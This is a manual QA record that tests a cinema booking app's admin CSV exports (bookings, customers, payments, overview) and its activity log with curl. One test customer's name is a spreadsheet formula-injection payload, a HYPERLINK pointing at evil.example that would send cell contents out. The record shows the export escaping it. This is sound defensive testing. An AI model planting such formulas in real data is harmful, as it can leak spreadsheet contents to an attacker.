---
title: U19 — Exports and activity - manual QA
owner: Mohamed Tarek
status: Done
last_verified: 2026-10-29
tags: [exports, csv, activity-log, qa, curl]
---

# U19 — Exports and activity: manual QA

Issue #20. Mode: `curl` (CLAUDE.md "QA mode"). Spec: `docs/gh-20-exports-activity/spec.md`.

## Setup

- The app built from this branch (`npm run build`), run with `node dist/main.js` on port 3127
  against the unit's own development database `maqady_u19_dev` (local Postgres 16), with the
  registration and sign-in rate limits raised for the session only
  (`RATE_LIMIT_REGISTRATION_IP=200/1h RATE_LIMIT_SIGN_IN_IP=200/1m RATE_LIMIT_SIGN_IN_EMAIL=100/1m`,
  environment variables, not `.env`). `EMAIL_DRIVER=simulated`, `STORAGE_DRIVER=local`.
- `npm run seed` (dataset `demo`): theaters, halls, movies and a week of showtimes. Run time
  2026-10-30 01:5x UTC, which is 03:5x Cairo time, so **today's cinema date is 2026-10-29** (a
  cinema day runs 06:00 to 06:00) and the first showtimes are on 2026-10-30.
- An active box office member `QA Box Office` created through `StaffService` (a scratch script,
  setup only); the admin is the seed's `Seed Admin`.
- Data through the real routes (`POST /auth/registrations`, `PATCH /me`, `POST /showtimes/1/holds`,
  `POST /bookings/{ref}/payments`, `POST /admin/counter-holds`,
  `POST /admin/bookings/{ref}/counter-payments`, `POST /admin/bookings/{ref}/refunds`), all on
  showtime 1 (Maqady Zamalek, Hall 1, 2026-10-30 13:30):
  - five customers named `=HYPERLINK("http://evil.example/?x="&A1,"Open")`, `+Plus Hassan`
    (phone `01012345678`), `-Minus Hassan`, `@At Hassan` and `Nadia Farouk`, each paying for 2
    seats (card; Nadia by Apple Pay);
  - a box office cash sale to a typed contact `Walk In Karim` (`01098765432`);
  - the `-Minus Hassan` booking cancelled and refunded by the admin;
  - a live hold (`Probe2`, G1) left from setting up.

`$B` is `http://localhost:3127/api/v1`, `$A` the admin's `Authorization` header, `$X` the box
office member's. Responses are trimmed (`cut`, `head`) where noted; nothing else is edited.

## 1. Bookings CSV: headers, BOM, rows

```
$ curl -s -D - -o bookings.csv "$B/admin/exports/bookings.csv" -H "$A" | grep -iE '^(HTTP|content-type|content-disposition|cache-control|transfer-encoding)'
HTTP/1.1 200 OK
Cache-Control: private, no-store
Content-Type: text/csv; charset=utf-8
Content-Disposition: attachment; filename="maqady-bookings-2026-10-29.csv"
Transfer-Encoding: chunked

$ head -c 3 bookings.csv | od -An -tx1
 ef bb bf

$ head -n 8 bookings.csv | cut -c1-230
Reference,Status,Payment status,Channel,Owner,Contact name,Contact email,Contact phone,Movie,Theater,Hall,Starts at,Cinema date,Seats,Seat count,Total,Currency,Payment method,Card brand,Card last 4,Wallet,Receipt reference,Crea
MQ-3G6RSH,confirmed,paid,counter,staff,Walk In Karim,,'+201098765432,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,K3 K4,2,460,EGP,cash,,,,,2026-10-30T03:56:27+02:00,2026-10-30T03:56:27+02:00,
MQ-GYWNC7,confirmed,paid,online,customer,Nadia Farouk,qa-u19-5-69364@example.com,,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,J5 J13,2,460,EGP,wallet,,,apple_pay,,2026-10-30T03:56:27+02:00,2026-1
MQ-T7V93R,confirmed,paid,online,customer,'@At Hassan,qa-u19-4-32050@example.com,,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,J4 J12,2,460,EGP,card,visa,4242,,,2026-10-30T03:56:26+02:00,2026-10-30
MQ-J3TCY3,refunded,refunded,online,customer,'-Minus Hassan,qa-u19-3-49439@example.com,,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,J3 J11,2,460,EGP,card,visa,4242,,,2026-10-30T03:56:26+02:00,2026
MQ-C9G57J,confirmed,paid,online,customer,'+Plus Hassan,qa-u19-2-95009@example.com,'+201012345678,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,J2 J10,2,460,EGP,card,visa,4242,,,2026-10-30T03:56:26+
MQ-836ANR,confirmed,paid,online,customer,"'=HYPERLINK(""http://evil.example/?x=""&A1,""Open"")",qa-u19-1-61636@example.com,,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,J1 J9,2,460,EGP,card,visa,4
MQ-8NPXGZ,held,unpaid,online,customer,Probe2,qa-u19-probe2@example.com,,The Last Lighthouse,Maqady Zamalek,Hall 1,2026-10-30T13:30:00+02:00,2026-10-30,G1,1,190,EGP,,,,,,2026-10-30T03:55:56+02:00,,

$ grep -c . bookings.csv
9
$ curl -s "$B/admin/bookings?limit=1" -H "$A" | python3 -c 'import sys,json; print(json.load(sys.stdin)["total"])'
8
```

Result: a streamed (`chunked`) UTF-8 file with a BOM, the header and the list's 8 rows newest
first. Every name starting with `=`, `+`, `-` or `@` and both E.164 phones are prefixed with `'`;
the `=HYPERLINK(…)` cell is also quoted, its quotes doubled. Money is in pounds (`460`, `190`).

## 2. Bookings CSV with filters, against the list

```
$ curl -s "$B/admin/exports/bookings.csv?status=refunded" -H "$A" | cut -d, -f1-8
Reference,Status,Payment status,Channel,Owner,Contact name,Contact email,Contact phone
MQ-J3TCY3,refunded,refunded,online,customer,'-Minus Hassan,qa-u19-3-49439@example.com,

$ curl -s "$B/admin/exports/bookings.csv?channel=counter" -H "$A" | cut -d, -f1-8
Reference,Status,Payment status,Channel,Owner,Contact name,Contact email,Contact phone
MQ-3G6RSH,confirmed,paid,counter,staff,Walk In Karim,,'+201098765432

$ curl -s "$B/admin/exports/bookings.csv?q=hassan" -H "$A" | cut -d, -f1,6-8
Reference,Contact name,Contact email,Contact phone
MQ-T7V93R,'@At Hassan,qa-u19-4-32050@example.com,
MQ-J3TCY3,'-Minus Hassan,qa-u19-3-49439@example.com,
MQ-C9G57J,'+Plus Hassan,qa-u19-2-95009@example.com,'+201012345678

$ curl -s "$B/admin/bookings?q=hassan&limit=100" -H "$A" | python3 -c '…print references…'
['MQ-T7V93R', 'MQ-J3TCY3', 'MQ-C9G57J']
```

Result: the filtered files hold exactly the list's rows for the same filters, in its order.

## 3. Customers CSV

```
$ curl -s -D - "$B/admin/exports/customers.csv?q=hassan" -H "$A" | grep -iE '^content-disposition|^ID|hassan' | cut -c1-160
Content-Disposition: attachment; filename="maqady-customers-2026-10-29.csv"
11,'@At Hassan,qa-u19-4-32050@example.com,,active,no,,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,1,460,EGP,0,2026-10-30T03:56
10,'-Minus Hassan,qa-u19-3-49439@example.com,,active,no,,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,0,0,EGP,0,
9,'+Plus Hassan,qa-u19-2-95009@example.com,'+201012345678,active,no,,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,2026-10-30T03:56:26+02:00,1,460,EGP,0,2
```

Result: the list's rows with their numbers (the refunded customer has 0 bookings and 0 spent, as
on the screen); names and phones escaped; `Email verified` reads `no`.

## 4. Payments CSV

```
$ curl -s "$B/admin/exports/payments.csv" -H "$A" | cut -d, -f1,4-13,16 | head -12
ID,Kind,Purpose,Method,Channel,Status,Failure reason,Ledger status,Amount,Currency,Refund of payment,Booking reference
7,refund,cancellation,card,online,succeeded,,succeeded,-460,EGP,3,MQ-J3TCY3
6,charge,sale,cash,counter,succeeded,,succeeded,460,EGP,,MQ-3G6RSH
5,charge,sale,wallet,online,succeeded,,succeeded,460,EGP,,MQ-GYWNC7
4,charge,sale,card,online,succeeded,,succeeded,460,EGP,,MQ-T7V93R
3,charge,sale,card,online,refunded,,succeeded,460,EGP,,MQ-J3TCY3
2,charge,sale,card,online,succeeded,,succeeded,460,EGP,,MQ-C9G57J
1,charge,sale,card,online,succeeded,,succeeded,460,EGP,,MQ-836ANR

$ curl -s "$B/admin/exports/payments.csv?kind=refund" -H "$A" | cut -d, -f1,4-13,16
ID,Kind,Purpose,Method,Channel,Status,Failure reason,Ledger status,Amount,Currency,Refund of payment,Booking reference
7,refund,cancellation,card,online,succeeded,,succeeded,-460,EGP,3,MQ-J3TCY3

$ curl -s "$B/admin/exports/payments.csv?dateFrom=2026-10-30&dateTo=2026-10-29" -H "$A"
{"error":{"code":"VALIDATION_FAILED","message":"The request is not valid.","details":{"fields":[{"field":"dateTo","messages":["dateTo must be on or after dateFrom"]}]},"correlationId":"4ba8282e-4414-4587-8b98-f10d3ee8135f"}}
```

Result: every charge and refund newest first, the shown status (`refunded` for the refunded
charge, its ledger `succeeded`), the refund a plain negative number (`-460`, not escaped).

## 5. Overview CSV

```
$ curl -s "$B/admin/exports/overview.csv?period=today" -H "$A" | head -16
Section,Cinema date,Subject ID,Subject,Metric,Unit,Value,Previous,Change
period,,,All theaters,preset,text,today,,
period,,,All theaters,dateFrom,date,2026-10-29,,
period,,,All theaters,dateTo,date,2026-10-29,,
period,,,All theaters,days,count,1,,
period,,,All theaters,comparison,text,same_weekday_last_week,,
period,,,All theaters,comparisonDateFrom,date,2026-10-22,,
period,,,All theaters,comparisonDateTo,date,2026-10-22,,
period,,,All theaters,generatedAt,text,2026-10-30T03:56:53+02:00,,
kpis,,,All theaters,revenue,EGP,0,0,
kpis,,,All theaters,ticketsSold,count,0,0,
kpis,,,All theaters,occupancy,ratio,,,
kpis,,,All theaters,averageTicket,EGP,,,
kpis,,,All theaters,counterShare,ratio,,,
payment_methods,,,card,amount,EGP,0,,
payment_methods,,,card,share,ratio,,,

$ curl -s "$B/admin/exports/overview.csv?theaterId=1&dateFrom=2026-10-30&dateTo=2026-10-30" -H "$A" | grep -E "^(kpis|by_theater|by_hall)" | head -14
kpis,,1,Maqady Zamalek,revenue,EGP,2300,0,
kpis,,1,Maqady Zamalek,ticketsSold,count,10,0,
kpis,,1,Maqady Zamalek,occupancy,ratio,0.013,,
kpis,,1,Maqady Zamalek,averageTicket,EGP,230,,
kpis,,1,Maqady Zamalek,counterShare,ratio,0.2,,
by_theater,,1,Maqady Zamalek,revenue,EGP,2300,0,
by_theater,,1,Maqady Zamalek,online,EGP,1840,,
by_theater,,1,Maqady Zamalek,counter,EGP,460,,
by_theater,,1,Maqady Zamalek,averageTicket,EGP,230,,
by_theater,,1,Maqady Zamalek,ticketsSold,count,10,,
by_theater,,1,Maqady Zamalek,seatsOnSale,count,768,,
by_theater,,1,Maqady Zamalek,occupancy,ratio,0.013,,
by_theater,,1,Maqady Zamalek,showtimeCount,count,4,,
by_hall,,1,Hall 1,revenue,EGP,2300,,

$ curl -s "$B/admin/overview?theaterId=1&dateFrom=2026-10-30&dateTo=2026-10-30" -H "$A" | python3 -c '…'
{'revenue': {'amount': 230000, 'currency': 'EGP'}, 'ticketsSold': 10, 'occupancy': 0.013, 'averageTicket': {'amount': 23000, 'currency': 'EGP'}, 'counterShare': 0.2}
[(1, 230000, 184000, 46000)]
[(1, 'Hall 1', 230000, 10)]

$ curl -s "$B/admin/exports/overview.csv?theaterId=999999" -H "$A"
{"error":{"code":"NOT_FOUND","message":"The requested resource was not found.","details":null,"correlationId":"78e34a71-0a1b-48a0-b4c5-4467855aaf1c"}}
```

Result: the file is the Overview of the same query figure for figure (230000 piastres = 2300
EGP; online 1840 + counter 460; 10 tickets; Hall 1 with one theater selected). Today's cinema
day (the 29th) has no sales, since every booking is for the 30th's shows (revenue counts by the
showtime's cinema date).

## 6. Refusals

```
$ curl -s "$B/admin/exports/bookings.csv?cursor=abc&limit=5" -H "$A"
{"error":{"code":"VALIDATION_FAILED",…,"details":{"fields":[{"field":"cursor","messages":["property cursor should not exist"]},{"field":"limit","messages":["property limit should not exist"]}]},…}
$ curl -s "$B/admin/exports/bookings.csv?dateFrom=2026-10-30&dateTo=2026-10-01" -H "$A"
{"error":{"code":"VALIDATION_FAILED",…,"details":{"fields":[{"field":"dateTo","messages":["dateTo must be on or after dateFrom"]}]},…}
$ for d in overview bookings customers payments; do curl -s -o /dev/null -w "$d box-office %{http_code} " "$B/admin/exports/$d.csv" -H "$X"; curl -s -o /dev/null -w "no-token %{http_code}\n" "$B/admin/exports/$d.csv"; done
overview box-office 403 no-token 401
bookings box-office 403 no-token 401
customers box-office 403 no-token 401
payments box-office 403 no-token 401
$ curl -s "$B/admin/exports/payments.csv" -H "$X"
{"error":{"code":"FORBIDDEN","message":"You do not have access to this.","details":null,"correlationId":"bc9d9e63-1902-4bd2-8326-6b16a28175dc"}}
```

## 7. Audit rows

```
$ psql -d maqady_u19_dev -tAc "select id, actor_kind, actor_staff_user_id, entity_type, entity_id, metadata from audit_events where action='export.downloaded' order by id"
328|staff|1|export||{"dataset": "customers"}
329|staff|1|export||{"dataset": "overview"}
330|staff|1|export||{"dataset": "customers"}
364|staff|1|export||{"dataset": "bookings"}
365|staff|1|export||{"status": "refunded", "dataset": "bookings"}
366|staff|1|export||{"channel": "counter", "dataset": "bookings"}
367|staff|1|export||{"search": true, "dataset": "bookings"}
368|staff|1|export||{"search": true, "dataset": "customers"}
369|staff|1|export||{"dataset": "payments"}
370|staff|1|export||{"kind": "refund", "dataset": "payments"}
371|staff|1|export||{"period": "today", "dataset": "overview"}
372|staff|1|export||{"period": "7d", "dataset": "overview", "theaterId": 1}
```

Result: one row per successful download (328–330 are from a smoke test before the data), the
filters given, the search only as `search: true` (never `hassan`); none for the refused requests
of section 6 nor for the `NOT_FOUND` overview.

## 8. Activity log

```
$ curl -s "$B/admin/activity?limit=3" -H "$A" | python3 -m json.tool | head -27
{
    "items": [
        {
            "id": 372,
            "occurredAt": "2026-10-30T03:56:53+02:00",
            "cinemaDate": "2026-10-29",
            "action": "export.downloaded",
            "actor": {
                "kind": "staff",
                "staff": { "id": 1, "fullName": "Seed Admin" },
                "customerId": null
            },
            "entity": { "type": "export", "id": null },
            "booking": null,
            "changedFields": [],
            "metadata": { "period": "7d", "dataset": "overview", "theaterId": 1 }
        },
        …

$ curl -s "$B/admin/activity?entityType=export&limit=100" -H "$A" | python3 -c '…'
12 [(372, 'overview'), (371, 'overview'), (370, 'payments'), (369, 'payments'), (368, 'customers'), (367, 'bookings')]

$ curl -s "$B/admin/activity?staffUserId=<QA Box Office>&limit=100" -H "$A" | python3 -c '…'
8 [('booking.confirmed', 'QA Box Office', 'MQ-3G6RSH'), ('booking.held', 'QA Box Office', 'MQ-3G6RSH'), ('payment.succeeded', 'QA Box Office', 'MQ-3G6RSH'), ('session.created', 'QA Box Office', None)]

$ curl -s "$B/admin/activity?entityType=booking&entityId=<MQ-J3TCY3's id>" -H "$A" | python3 -c '…'
3 [('booking.refunded', 'staff', 'MQ-J3TCY3'), ('booking.confirmed', 'customer', 'MQ-J3TCY3'), ('booking.held', 'customer', 'MQ-J3TCY3')]

$ curl -s "$B/admin/activity?actorKind=customer&action=booking.held&limit=100" -H "$A" | python3 -c '…'
7 {'kind': 'customer', 'staff': None, 'customerId': 12}

$ curl -s "$B/admin/activity?dateFrom=2026-10-29&dateTo=2026-10-29&limit=1" -H "$A" | python3 -c '…'
372 2026-10-29
$ curl -s "$B/admin/activity?dateFrom=2026-10-30&limit=1" -H "$A" | python3 -c '…'
0

$ C=$(… ?limit=2 … nextCursor); curl -s "$B/admin/activity?limit=2&cursor=$C" -H "$A" | …; curl -s "$B/admin/activity?limit=4" -H "$A" | …
[370, 369]
[372, 371, 370, 369]

$ curl -s "$B/admin/activity?entityId=5" -H "$A"
{"error":{"code":"VALIDATION_FAILED",…,"details":{"fields":[{"field":"entityId","messages":["entityId needs entityType"]}]},…}
$ curl -s "$B/admin/activity?entityType=Booking" -H "$A"
{"error":{"code":"VALIDATION_FAILED",…,"details":{"fields":[{"field":"entityType","messages":["entityType must be a lower-case name such as booking"]}]},…}
$ curl -s "$B/admin/activity" -H "$X"
{"error":{"code":"FORBIDDEN","message":"You do not have access to this.","details":null,"correlationId":"73f48a3e-e5d4-4c66-ab6b-eee3340c43d2"}}
```

Result: newest first, the second page continues the first exactly; staff by name, customers by
id, booking references on booking and payment events; every filter narrows as documented; every
event of the run is on cinema date 2026-10-29 (Cairo 03:5x), none on the 30th.

## 9. No personal data

```
$ curl -s "$B/admin/activity?limit=100" -H "$A" > activity.json; grep -c -E 'Hassan|Nadia|Karim|HYPERLINK|example.com|1012345678|1098765432' activity.json
0
$ grep -c -E 'Hassan|Nadia|Karim|HYPERLINK|qa-u19|1012345678|1098765432' app.log
0
```

Result: neither the Activity log nor the server log (every request line of this QA) holds a
customer's name, email or phone.

## Not covered by hand

- A download larger than one batch (500 rows), and a failure after the first byte: covered by the
  integration suite (batches of 2 with one page query per batch observed), the unit tests of
  `csvStream()` (lazy reads, a mid-stream failure destroys the stream) and the controller's unit
  test on real Express (the connection is cut and the failure logged; review R1).
- Leading tab and carriage return in a name: the HTTP routes trim names, so they cannot be typed
  through the API; the integration suite writes them through the service and checks both are
  prefixed.
